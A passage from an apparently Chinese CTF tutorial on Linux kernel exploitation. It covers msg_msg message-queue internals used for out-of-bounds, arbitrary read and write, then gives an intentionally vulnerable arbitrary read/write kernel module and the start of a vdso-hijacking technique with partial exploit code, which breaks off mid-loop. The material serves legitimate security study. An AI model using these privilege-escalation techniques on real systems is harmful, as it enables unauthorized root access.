queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n  ```\n\n- `mtype`\n\n  可通过设置该值来实现不同顺序的消息读取，在之后的堆块构造中很有用\n\n  - 在写入消息时，指定`mtype`，后续接收消息时可以依据此`mtype`来进行非顺序接收\n  - 在读取消息时，指定`msgtyp`，分为如下情况\n    - `msgtyp`大于0：那么在`find_msg`函数中，就会将遍历寻找消息队列里的第一条等于`msgtyp`的消息，然后进行后续操作。\n    - `msgtyp`等于0：即类似于顺序读取，`find_msg`函数会直接获取到消息队列首个消息。\n    - `msgtyp`小于0：会将等待的消息当成优先队列来处理，`mtype`的值越小，其优先级越高。\n\n- `msg_flag`\n\n可以关注一下`MSG_NOERROR`标志位，比如说`msg_flag`没有设置`MSG_NOERROR`的时候，那么情况如下：\n\n假定获取消息时输入的长度`m_ts_size`为`0x200`，且这个长度大于通过`find_msg()`函数获取到的消息长度`0x200`，则可以顺利读取，如果该长度小于获取到的消息长度`0x200`，则会出现如下错误\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png)\n\n但是如果设置了`MSG_NOERROR`，那么即使传入接收消息的长度小于获取到的消息长度，仍然可以顺利获取，但是多余的消息会被截断，相关内存还是会被释放，这个在源代码中也有所体现。\n\n```c\n//v5.11 /ipc/msg.c do_msgrcv函数中\nif ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n    msg = ERR_PTR(-E2BIG);\n    goto out_unlock0;\n}\n```\n\n此外还有更多的`msg_flag`，就不一一举例了。\n\n#### ③释放\n\n这个主要是用到`msgctl`封装函数或者`__NR_msgctl`系统调用，直接释放掉所有的消息结构，包括申请的`msg_queue`的结构\n\n```c\n//其中IPC_RMID这个cmd命令代表释放掉该消息队列的所有消息,各种内存结构体等\nif(msgctl(queue_id),IPC_RMID,NULL)==-1)\n{\n    perror(\"msgctl\");\n    exit(-1);\n}\n```\n\n不过一般也用不到，可能某些合并obj的情况能用到?\n\n此外还有更多的`cmd`命令，常用来设置内核空间的`msg_queue`结构上的相关数据，不过多介绍了。\n\n#### 总结\n\n总结一下大致的使用方法如下\n\n```c\ntypedef struct\n{\n        long mtype;\n        char mtext[1];\n}msgp;\n\nint32_t make_queue(key_t key, int msg_flag)\n{\n    int32_t result;\n    if ((result = msgget(key, msg_flag)) == -1) \n    {\n        perror(\"msgget failure\");\n        exit(-1);\n    }\n    return result;\n}\n\n\n\nvoid get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n{\n    if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n    {\n        perror(\"msgrcv\");\n        exit(-1);\n    }\n    return;\n}\n\nvoid send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n{\n    if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n    {\n        perror(\"msgsend failure\");\n        exit(-1);\n    }\n    return;\n}\n\n\nint main()\n{\n    int queue_id, m_ts_size;\n    char queue_recv_buf[0x2000];\n    char queue_send_buf[0x2000];\n    \n    m_ts_size = 0x400-0x30;\n    msgp *message = (msgp *)queue_send_buf;\n    message->mtype = 0;\n    \n    memset(message->mtext,'\\xaa', m_ts_size);\n    memset(queue_recv_buf, '\\xbb', sizeof(queue_recv_buf));\n    \n    queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n    send_msg(queue_id, message, m_ts_size, 0);\n    get_msg(queue_id, queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n    \n    return 0;\n}\n```\n\n### (2)内存分配与释放\n\n#### ①创建\n\n##### A.内存申请\n\n- 还是需要先创建`msg_queue`结构体，使用`msgget`函数，调用链为\n\n  ```\n  msgget(key,msg_flag)->ksys_msgget()->ipcget()->ipcget_new()->newque()\n  ```\n\n  主要还是关注最后的`newque()`函数，在该函数中使用`kvmalloc()`申请堆块，大小为0x100，属于`kmalloc-256`，(不同版本大小貌似不同)。\n\n  ```c\n  //v5.11 /ipc/msg.c\n  static int newque(struct ipc_namespace *ns, struct ipc_params *params)\n  {\n  \tstruct msg_queue *msq;\n  \tint retval;\n  \tkey_t key = params->key;\n  \tint msgflg = params->flg;\n  \n      //这个才是实际申请的堆块内存\n  \tmsq = kvmalloc(sizeof(*msq), GFP_KERNEL);\n  \tif (unlikely(!msq))\n  \t\treturn -ENOMEM;\n  \n  \tmsq->q_perm.mode = msgflg & S_IRWXUGO;\n  \tmsq->q_perm.key = key;\n  \n  \tmsq->q_perm.security = NULL;\n      //进行相关注册\n  \tretval = security_msg_queue_alloc(&msq->q_perm);\n  \tif (retval) {\n  \t\tkvfree(msq);\n  \t\treturn retval;\n  \t}\n  \n      //初始化\n  \tmsq->q_stime = msq->q_rtime = 0;\n  \tmsq->q_ctime = ktime_get_real_seconds();\n  \tmsq->q_cbytes = msq->q_qnum = 0;\n  \tmsq->q_qbytes = ns->msg_ctlmnb;\n  \tmsq->q_lspid = msq->q_lrpid = NULL;\n  \tINIT_LIST_HEAD(&msq->q_messages);\n  \tINIT_LIST_HEAD(&msq->q_receivers);\n  \tINIT_LIST_HEAD(&msq->q_senders);\n  \n      //下面一堆看不懂在干啥\n  \t/* ipc_addid() locks msq upon success. */\n  \tretval = ipc_addid(&msg_ids(ns), &msq->q_perm, ns->msg_ctlmni);\n  \tif (retval < 0) {\n  \t\tipc_rcu_putref(&msq->q_perm, msg_rcu_free);\n  \t\treturn retval;\n  \t}\n  \tipc_unlock_object(&msq->q_perm);\n  \trcu_read_unlock();\n  \n  \treturn msq->q_perm.id;\n  }\n  ```\n\n  创建的结构体如下所示\n\n  ```c\n  //v5.11 /ipc/msg.c\n  struct msg_queue {\n      //这些为一些相关信息\n  \tstruct kern_ipc_perm q_perm;\n  \ttime64_t q_stime;\t\t/* last msgsnd time */\n  \ttime64_t q_rtime;\t\t/* last msgrcv time */\n  \ttime64_t q_ctime;\t\t/* last change time */\n  \tunsigned long q_cbytes;\t\t/* current number of bytes on queue */\n  \tunsigned long q_qnum;\t\t/* number of messages in queue */\n  \tunsigned long q_qbytes;\t\t/* max number of bytes on queue */\n  \tstruct pid *q_lspid;\t\t/* pid of last msgsnd */\n  \tstruct pid *q_lrpid;\t\t/* last receive pid */\n  \n      //存放msg_msg相关指针next、prev,比较重要,通常拿来溢出制造UAF\n      //和该消息队列里的所有消息组成双向循环链表\n  \tstruct list_head q_messages;\n  \tstruct list_head q_receivers;\n  \tstruct list_head q_senders;\n  } __randomize_layout;\n  \n  ```\n\n- 接着当使用`msgsnd`函数传递消息时，会创建新的`msg_msg`结构体，消息过长的话就会创建更多的`msg_msgseg`来存储更多的消息。相关的函数调用链如下：\n\n  ```c\n  msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)->do_msgsnd()->load_msg()->alloc_msg()\n  ```\n\n  主要还是关注在`alloc_msg()`函数\n\n  ```c\n  //v5.11 /ipc/msgutil.c\n  static struct msg_msg *alloc_msg(size_t len)\n  {\n  \tstruct msg_msg *msg;\n  \tstruct msg_msgseg **pseg;\n  \tsize_t alen;\n  \n      //最大发送DATALEN_MSG长度的消息\n      //#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n      //这里的PAGE_SIZE为0x400,即最多kmalloc-\n  \talen = min(len, DATALEN_MSG);\n      //使用正常\n  \tmsg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);\n  \tif (msg == NULL)\n  \t\treturn NULL;\n  \n      //如果传入消息长度超过0x400-0x30,就再进行申请msg_msgseg。\n      //使用kmalloc申请,标志为GFP_KERNEL_ACCOUNT。\n      //最大也为0x400,也属于kmalloc-1024\n      //还有再长的消息,就再申请msg_msgseg\n  \tmsg->next = NULL;\n  \tmsg->security = NULL;\n  \tlen -= alen;\n  \tpseg = &msg->next;\n  \twhile (len > 0) {\n  \t\tstruct msg_msgseg *seg;\n  \t\t//不知道干啥的\n  \t\tcond_resched();\n  \n  \t\talen = min(len, DATALEN_SEG);\n  \t\tseg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);\n          //申请完之后,将msg_msgseg放到msg->next这个单向链表上\n  \t\tif (seg == NULL)\n  \t\t\tgoto out_err;\n  \t\t*pseg = seg;\n  \t\tseg->next = NULL;\n  \t\tpseg = &seg->next;\n  \t\tlen -= alen;\n  \t}\n  \n  \treturn msg;\n  \n  out_err:\n  \tfree_msg(msg);\n  \treturn NULL;\n  }\n  ```\n\n  - `msg_msg`结构体如下，头部大小`0x30`\n\n    ```c\n    //v5.11 /include/linux/msg.h\n    struct msg_msg {\n    \tstruct list_head m_list;//与msg_queue或者其他的msg_msg组成双向循环链表\n    \tlong m_type;\n    \tsize_t m_ts;\t\t/* message text size */\n    \tstruct msg_msgseg *next;//单向链表，指向该条信息后面的msg_msgseg\n    \tvoid *security;\n    \t/* the actual message follows immediately */\n    };\n    ```\n\n    如下所示\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png\" alt=\"image-20220511220130886\" style=\"zoom:80%;\" />\n\n  - `msg_msgseq`结构如下，只是一个`struct msg_msgseg*`指针\n\n    ```c\n    //v5.11 /ipc/msgutil.c\n    struct msg_msgseg {\n    \tstruct msg_msgseg *next;\n    \t/* the next part of the message follows immediately */\n    };\n    ```\n\n    如下所示\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png\" alt=\"image-20220511220627775\" style=\"zoom:80%;\" />\n\n###### 相关内存结构：\n\n在一个`msg_queue`队列下，消息长度为`0x1000-0x30-0x8-0x8-0x8`\n\n- 一条消息：\n\n  ![image-20220511231539231](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png)\n\n- 两条消息：\n\n  以`msg_queue`的`struct list_head q_messages;`域为链表头，和`msg_msg`结构的`struct list_head m_list`域串联所有的`msg_msg`形成双向循环链表\n\n  ![未命名文件](https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png)\n\n同理，同一个`msg_queue`消息队列下的多条消息也是类似的\n\n###### 内存申请总结：\n\n- 使用`msgget()`函数创建内核空间的消息队列结构`msg_msgseg`，返回值为消息队列的`id`标志`queue_id`\n  - `msg_msgseg`管理整个消息队列，大小为0x100，`kmalloc-256`。\n  - 其`struct list_head q_messages;`域为链表头，和`msg_msg`结构的`struct list_head m_list`域串联所有的`msg_msg`形成双向循环链表\n- 每次在该消息队列`queue_id`下调用`msgsnd()`函数都会申请内核空间的`msg_msg`结构，消息长度大于`0x400-0x30`就会申请内核空间的`msg_msgseg`结构\n  - `msg_msg`为每条消息存放消息数据的结构，与`msg_queue`形成双向循环链表，与`msg_msgseg`形成单向链表大小最大为0x400，属于`kmalloc-64`至`kmalloc-1024`\n  - `msg_msgseg`也为每条消息存放消息数据的结构，挂在`msg_msg`单向链表中，大小最大为`0x400`，属于`kmalloc-16`至`kmalloc-1024`，当消息长度很长时就会申请很多的内核空间的`msg_msgseg`结构。\n\n\n\n##### B.数据复制\n\n调用完`alloc_msg()`函数后，回到`load_msg()`函数接着进行数据复制，函数还是挺简单的。\n\n```c\nstruct msg_msg *load_msg(const void __user *src, size_t len)\n{\n\tstruct msg_msg *msg;\n\tstruct msg_msgseg *seg;\n\tint err = -EFAULT;\n\tsize_t alen;\n\n\tmsg = alloc_msg(len);\n\tif (msg == NULL)\n\t\treturn ERR_PTR(-ENOMEM);\n\n    //先复制进msg_msg中存放消息的部分\n\talen = min(len, DATALEN_MSG);\n\tif (copy_from_user(msg + 1, src, alen))\n\t\tgoto out_err;\n\n    //遍历msg_msg下的msg_msgseg,逐个存放数据进去\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tsrc = (char __user *)src + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_from_user(seg + 1, src, alen))\n\t\t\tgoto out_err;\n\t}\n\n\terr = security_msg_msg_alloc(msg);\n\tif (err)\n\t\tgoto out_err;\n\n\treturn msg;\n\nout_err:\n\tfree_msg(msg);\n\treturn ERR_PTR(err);\n}\n```\n\n\n\n#### ②释放\n\n相关的函数调用链\n\n```\nmsgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)->SYS_msgrcv()->ksys_msgrcv()->do_msgrcv()->do_msg_fill()->store_msg()\n```\n\n首先关注一下`do_msgrcv()`函数，里面很多东西都比较重要\n\n```c\nstatic long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,\n                      long (*msg_handler)(void __user *, struct msg_msg *, size_t))\n{\n    int mode;\n    struct msg_queue *msq;\n    struct ipc_namespace *ns;\n    struct msg_msg *msg, *copy = NULL;\n    DEFINE_WAKE_Q(wake_q);\n    //....\n    if (msqid < 0 || (long) bufsz < 0)\n        return -EINVAL;\n    //设置了MSG_COPY标志位就会准备一个msg_msg的副本copy,通常用来防止unlink\n    if (msgflg & MSG_COPY) {\n        //从这里可以看出,同样也需要设置IPC_NOWAIT标志位才不会出错\n        if ((msgflg & MSG_EXCEPT) || !(msgflg & IPC_NOWAIT))\n            return -EINVAL;\n        //这个prepare_copy()函数内部调用了load_msg()函数来创建一个新的msg_msg/msg_msgseg\n        //传入的size参数为bufsz,就用户空间实际需要消息的长度,那么申请的堆块长度就可变了\n        //不一定是这条消息的长度,而是由我们直接控制,虽然最后也会释放掉\n        copy = prepare_copy(buf, min_t(size_t, bufsz, ns->msg_ctlmax));\n        /*\n        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)\n        {\n            struct msg_msg *copy;\n            \n            copy = load_msg(buf, bufsz);\n            if (!IS_ERR(copy))\n                copy->m_ts = bufsz;\n            return copy;\n        }\n        */\n        if (IS_ERR(copy))\n            return PTR_ERR(copy);\n    }\n    //这样就不会将msg_msg从msg_queue消息队列中进行Unlink摘除\n    //只是释放堆块,在后续的代码中有显示\n    //......\n    //开始从msg_queue中寻找合适的msg_msg\n    for (;;) {\n        //.....\n        msg = find_msg(msq, &msgtyp, mode);\n        if (!IS_ERR(msg)) {\n            /*\n\t\t\t * Found a suitable message.\n\t\t\t * Unlink it from the queue.\n\t\t\t */\n            //最好设置MSG_NOERROR标志位,这样请求获取消息长度小于m_ts程序也不会退出了\n            if ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n                msg = ERR_PTR(-E2BIG);\n                goto out_unlock0;\n            }\n            /*\n\t\t\t * If we are copying, then do not unlink message and do\n\t\t\t * not update queue parameters.\n\t\t\t */\n            //设置了MSG_COPY标志位就会将msg数据复制给copy,然后将copy赋给msg\n            if (msgflg & MSG_COPY) {\n                //这个copy_msg()函数就是之前提到的在汇编层面就很奇怪\n                msg = copy_msg(msg, copy);\n                goto out_unlock0;\n            }\n\n            //下面是将msg_msg从和msg_queue组成的双向循环链表中unlink出来的部分\n            list_del(&msg->m_list);\n            msq->q_qnum--;\n            msq->q_rtime = ktime_get_real_seconds();\n            ipc_update_pid(&msq->q_lrpid, task_tgid(current));\n            msq->q_cbytes -= msg->m_ts;\n            atomic_sub(msg->m_ts, &ns->msg_bytes);\n            atomic_dec(&ns->msg_hdrs);\n            ss_wakeup(msq, &wake_q, false);\n\n            goto out_unlock0;\n        }\n        //....\n    }\n\nout_unlock0:\n    ipc_unlock_object(&msq->q_perm);\n    wake_up_q(&wake_q);\nout_unlock1:\n    rcu_read_unlock();\n    //如果存在copy副本,那么就free掉copy副本,然后返回,而不会free掉原本的msg堆块\n    if (IS_ERR(msg)) {\n        free_copy(copy);\n        return PTR_ERR(msg);\n    }\n    //这个msg_handler函数指针即为传入的do_msg_fill()函数,从里面进行相关的数据复制\n    bufsz = msg_handler(buf, msg, bufsz);\n    //最后在这里进行相关堆块的释放\n    free_msg(msg);\n\n    return bufsz;\n}\n\n```\n\n##### A.非堆块释放的数据读取\n\n一般而言，我们使用`msg_msg`进行堆构造（比如溢出或者其他什么的）的时候，当需要从消息队列中读取消息而又不想释放该堆块时，会结合`MSG_COPY`这个`msgflg`标志位，防止在读取的时候发生堆块释放从而进行双向循环链表的`unlink`触发错误。\n\n```c\n//v5.11 do_msgrcv()函数中的\n/* If we are copying, then do not unlink message and do\n    * not update queue parameters.\n    */\nif (msgflg & MSG_COPY) {\n    msg = copy_msg(msg, copy);\n    goto out_unlock0;\n}\n\n//下面是unlink的部分,如果msg_msg结构被修改了可能会出错的\nlist_del(&msg->m_list);\nmsq->q_qnum--;\nmsq->q_rtime = ktime_get_real_seconds();\nipc_update_pid(&msq->q_lrpid, task_tgid(current));\nmsq->q_cbytes -= msg->m_ts;\natomic_sub(msg->m_ts, &ns->msg_bytes);\natomic_dec(&ns->msg_hdrs);\nss_wakeup(msq, &wake_q, false);\n\ngoto out_unlock0;\n```\n\n使用这个标志位还需要在内核编译的时候设置`CONFIG_CHECKPOINT_RESTORE=y`才行，否则还是会出错的\n\n```c\n//v5.11 /ipc/msgutil.c\n#ifdef CONFIG_CHECKPOINT_RESTORE\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\t//正常的一些数据复制\n}\n#else\n//如果没有设置CONFIG_CHECKPOINT_RESTORE=y则会出错\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\treturn ERR_PTR(-ENOSYS);\n}\n#endif\n```\n\n🔺注：还有一点不知道是不是什么bug，在某些内核版本中，至少我的`v5.11`中，`MSG_NOERROR`和`MSG_COPY`（后续会讲到）没有办法同时生效，关键点在于`copy_msg()`函数中，转化成汇编如下：\n\n![image-20220512163536660](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png)\n\n注意到红框的部分，获取`rdi(msg)`和`rsi(copy)`对应的`m_ts`进行比较，而`copy`的`m_ts`是从用户传进来的想要获取消息的长度，如果小于实际的`msg`的`m_ts`长度，那就标记错误然后退出。可以这个比较应该是在后面才会进行的，但是这里也突然冒出来，就很奇怪，导致这两个标志位没办法同时发挥作用。\n\n##### B.释放堆块的消息读取\n\n同理如果不指定`MSG_COPY`这个标志时，从消息队列中读取消息就会触发内存释放，这里就可以依据发送消息时设置的`mtype`和接收消息时设置的`msgtpy`来进行消息队列中各个位置的堆块的释放。\n\n##### C.数据复制\n\n不管什么标志位，只要不是`MSG_NOERROR`和`MSG_COPY`联合起来，并且申请读取消息长度`size`小于通过`find_msg()`函数获取到的实际消息的`m_ts`，那么最终都会走到do_msgrcv()函数的末尾，通过如下代码进行数据复制和堆块释放\n\n```c\nbufsz = msg_handler(buf, msg, bufsz);\nfree_msg(msg);\n```\n\n### (3)利用\n\n#### 越界读取\n\n这样，当我们通过之前提到的`double-free/UAF`，并且再使用`setxattr`来对`msg_msgmsg`中的`m_ts`进行修改，这样在我们调用`msgrcv`的时候就能越界从堆上读取内存了，就可能能够泄露到堆地址或者程序基地址。\n\n**使用`setxattr`的时候需要注意释放堆块时FD的位置，不同内核版本开启不同保护下FD的位置不太一样**\n\n为了获取到地址的成功性更大，我们就需要用到单个`msg_queue`和单个`msg_msg`的内存模型\n\n![image-20220511113542467](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png)\n\n可以看到单个`msg_msg`在`msg_queue`的管理下形成双向循环链表，所以如果我们通过`msgget`和`msgsnd`多申请一些相同大小的且只有一个`msg_msg`结构体的`msg_queue`，那么越界读取的时候，就可以读取到只有单个`msg_msg`的头部了\n\n而单个`msg_msg`由于双向循环链表，其头部中又存在指向`msg_queue`的指针，那么这样就能泄露出`msg_queue`的堆地址了。\n\n\n\n#### 任意读取\n\n完成上述泄露`msg_queue`的堆地址之后，就需要用到`msg_msg`的内存布局了\n\n由于我们的`msg_msg`消息的内存布局如下\n\n![5IcVxRaFQtg3HCW](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png)\n\n相关读取源码如下：\n\n```c\n//v4.9----ipc/msgutil.c\n#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n#define DATALEN_SEG\t((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))\n----------------------------------------------------------------\nint store_msg(void __user *dest, struct msg_msg *msg, size_t len)\n{\n\tsize_t alen;\n\tstruct msg_msgseg *seg;\n\n\talen = min(len, DATALEN_MSG);\n\tif (copy_to_user(dest, msg + 1, alen))\n\t\treturn -1;\n\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tdest = (char __user *)dest + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_to_user(dest, seg + 1, alen))\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n```\n\n所以如果我们可以修改`next`指针和`m_ts`，结合读取`msg`最终调用函数`store_msg`的源码，那么就能够实现任意读取。\n\n那么接着上面的，我们得到`msg_queue`之后，可以再将`msg_msg`的next指针指回`msg_queue`，读出其中的`msg_msg`，就能获得当前可控堆块的堆地址。\n\n这样完成之后，我们结合`userfaultfd`和`setxattr`频繁修改next指针就能基于当前堆地址来进行内存搜索了，从而能够完成地址泄露。\n\n同时需要注意的是，判断链表是否结束的依据为next是否为null，所以我们任意读取的时候，最好找到一个地方的next指针处的值为null。\n\n#### 任意写\n\n同样的，`msg_msg`由于next指针的存在，结合`msgsnd`也具备任意地址写的功能。我们可以在拷贝的时候利用`userfaultfd`停下来，然后更改next指针，使其指向我们需要的地方，比如`init_cred`结构体位置，从而直接修改进行提权。\n\n\n\n\n\n# 二、任意读写漏洞\n\n内核里的读写漏洞利用方式与用户态有点不太一样，利用方式也是多种多样。\n\n## 题目\n\n首先给出下题目\n\n```c\n#include <linux/module.h>\n#include <linux/version.h>\n#include <linux/kernel.h>\n#include <linux/types.h>\n#include <linux/kdev_t.h>\n#include <linux/fs.h>\n#include <linux/device.h>\n#include <linux/cdev.h>\n#include <asm/uaccess.h>\n#include <linux/slab.h>\n\n//设备驱动常用变量\n//static char *buffer_var = NULL;\nstatic char *buffer_var = NULL;\nstatic struct class *devClass; // Global variable for the device class\nstatic struct cdev cdev;\nstatic dev_t arbWriteModule_dev_no;\n\n\nstruct arbWriteNote\n{\n    ssize_t addr;\n    ssize_t len;\n    char* data;\n};\n\n\nstatic struct arbWriteNote* arbNoteObj;\n\n\n\nstatic long arbWriteModule_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);\n\nstatic int arbWriteModule_open(struct inode *i, struct file *f);\n\nstatic int arbWriteModule_close(struct inode *i, struct file *f);\n\n\n\nstatic struct file_operations arbWriteModule_fops =\n        {\n                .owner = THIS_MODULE,\n                .open = arbWriteModule_open,\n                .release = arbWriteModule_close,\n                .unlocked_ioctl = arbWriteModule_ioctl\n        };\n\n// 设备驱动模块加载函数\nstatic int __init arbWriteModule_init(void)\n{\n    printk(KERN_INFO \"[i] Module arbWriteModule registered\");\n    if (alloc_chrdev_region(&arbWriteModule_dev_no, 0, 1, \"arbWriteModule\") < 0)\n    {\n        return -1;\n    }\n    if ((devClass = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n    {\n        unregister_chrdev_region(arbWriteModule_dev_no, 1);\n        return -1;\n    }\n    if (device_create(devClass, NULL, arbWriteModule_dev_no, NULL, \"arbWriteModule\") == NULL)\n    {\n        printk(KERN_INFO \"[i] Module arbWriteModule error\");\n        class_destroy(devClass);\n        unregister_chrdev_region(arbWriteModule_dev_no, 1);\n        return -1;\n    }\n    cdev_init(&cdev, &arbWriteModule_fops);\n    if (cdev_add(&cdev, arbWriteModule_dev_no, 1) == -1)\n    {\n        device_destroy(devClass, arbWriteModule_dev_no);\n        class_destroy(devClass);\n        unregister_chrdev_region(arbWriteModule_dev_no, 1);\n        return -1;\n    }\n\n    printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(arbWriteModule_dev_no), MINOR(arbWriteModule_dev_no));\n    return 0;\n\n}\n\n// 设备驱动模块卸载函数\nstatic void __exit arbWriteModule_exit(void)\n{\n    // 释放占用的设备号\n    unregister_chrdev_region(arbWriteModule_dev_no, 1);\n    cdev_del(&cdev);\n}\n\n\n\n\n// ioctl函数命令控制\nlong arbWriteModule_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n    char* chunk = NULL;\n    char* buf;\n    int retval = 0;\n    switch (cmd) {\n        case 111: //arbRead\n            printk(\"Arbitrarily read function!---111\\n\");\n            arbNoteObj = (struct arbWriteNote*)arg;\n            copy_to_user(arbNoteObj->data,(char*)arbNoteObj->addr,arbNoteObj->len);\n            break;\n\n        case 222: //arbWrite\n            printk(\"Arbitrarily write function!---222\\n\");\n            arbNoteObj = (struct arbWriteNote*)arg;\n            buf = kmalloc(arbNoteObj->len,GFP_KERNEL);\n            copy_from_user(buf,arbNoteObj->data,arbNoteObj->len);\n            memcpy((char*)arbNoteObj->addr,buf,arbNoteObj->len);\n            kfree(buf);\n            break;\n\n\n        default:\n            retval = -1;\n            break;\n    }    \n    \n    return retval;\n\n}\n\n\nstatic int arbWriteModule_open(struct inode *i, struct file *f)\n{\n    printk(KERN_INFO \"[i] Module arbWriteModule: open()\\n\");\n    return 0;\n}\n\nstatic int arbWriteModule_close(struct inode *i, struct file *f)\n{\n    //kfree(buffer_var);\n    //buffer_var = NULL;\n    printk(KERN_INFO \"[i] Module arbWriteModule: close()\\n\");\n    return 0;\n}\n\nmodule_init(arbWriteModule_init);\nmodule_exit(arbWriteModule_exit);\n\nMODULE_LICENSE(\"GPL\");\n// MODULE_AUTHOR(\"blackndoor\");\n// MODULE_DESCRIPTION(\"Module vuln overflow\");\n\n\n```\n\n可以看到传入一个结构体，包含数据指针和地址，直接任意读写。\n\n## 不同劫持\n\n### 1.劫持vdso\n\n#### (1)前置知识\n\nvdso的代码数据在内核里，当程序需要使用时，会将vdso的内核映射给进程，也就是相当于把内核空间的vdso原封不动地复制到用户空间，然后调用在用户空间的vdso代码。\n\n如果我们能够将vdso给劫持为shellcode，那么当具有root权限的程序调用vdso时，就会触发我们的shellcode，而具有root权限的shellcode可想而知直接就可以。而vdso是经常会被调用的，所有只要我们劫持了vdso，大概率都会运行到我们的shellcode。\n\n真实环境中crontab会调用vdso中的gettimeofday，且是root权限的调用。\n\n而ctf题目中就通常可以用一个小程序来模拟调用。\n\n```C\n#include <stdio.h>  \n\nint main(){  \n    while(1)\n    {  \n        sleep(1);  \n        gettimeofday();  \n    }  \n}\n```\n\n将这个程序编译后放到init中，用nohup挂起，即可做到root权限调用gettimeofday：\n\n```bash\nnohup /gettimeofday &\n```\n\n#### (2)获取地址\n\n由于不同版本的linux内核中的vdso偏移不同，而题目给的vmlinux通常又没有符号表，所以需要我们自己利用任意读漏洞来测量。(如果题目没有任意读漏洞，建议可以自己编译一个对应版本的内核，然后自己写一个具备任意读的模块，加载之后测量即可，或者进行爆破，一般需要爆破一个半字节)\n\n例如这里给出的代码示例，就可以通过如下代码来将vdso从内核中dump下来。不过这种方式dump的是映射到用户程序的vdso，虽然内容是一样的，不过vdso在内核中的偏移却没有办法确定。\n\n```C\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sys/auxv.h> \n#include <sys/mman.h>\n\nint main(){\n    int test;\n    size_t result=0;\n    unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);\n    result=memmem(sysinfo_ehdr,0x1000,\"gettimeofday\",12);\n    printf(\"[+]VDSO : %p\\n\",sysinfo_ehdr);\n    printf(\"[+]The offset of gettimeofday is : %x\\n\",result-sysinfo_ehdr);\n    scanf(\"Wait! %d\", test);  \n    /* \n    gdb break point at 0x400A36\n    and then dump memory\n    why only dump 0x1000 ???\n    */\n    if (sysinfo_ehdr!=0){\n        for (int i=0;i<0x2000;i+=1){\n            printf(\"%02x \",*(unsigned char *)(sysinfo_ehdr+i));\n        }\n    }\n}\n```\n\n这种方法的原理是通过寻找gettimeofday字符串来得到映射到程序中的vdso的内存页，如下：\n\n![image-20211020150011934](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150019.png)\n\n之后把下面的内容都复制，放到CyberChef中，利用From Hex功能得到二进制文件\n\n![image-20211020150220448](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150220.png)\n\n然后就将得到的文件放到IDA中，即可自动解析到对应gettimeofday函数相对于vdso的函数偏移。\n\n![image-20211020150335000](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150335.png)\n\n这里就当是0xb20。\n\n之后通过任意读，类似基于本题编写的以下代码，获取vdso相对于vmlinux基址的偏移。\n\n```C\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <sys/time.h>\n#include <sys/auxv.h>\n\n\nstruct arbWriteNote\n{\n    ssize_t addr;\n    ssize_t len;\n    char* data;\n};\nstruct arbWriteNote arbWriteObj;\nint get_gettimeofday_str_offset();\n\nint main(int argc, char *argv[])\n{\n    int gettimeofday_str_offset = get_gettimeofday_str_offset();\n    printf(\"gettimeofday str in vdso.so offset=0x%x\\n\",gettimeofday_str_offset);\n    size_t vdso_addr = -1;\n    for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {\n        //读取一页数据\n        arbitrary_read(devFD,0x1000,buf,addr);\n        //如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址\n        //之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页\n        if 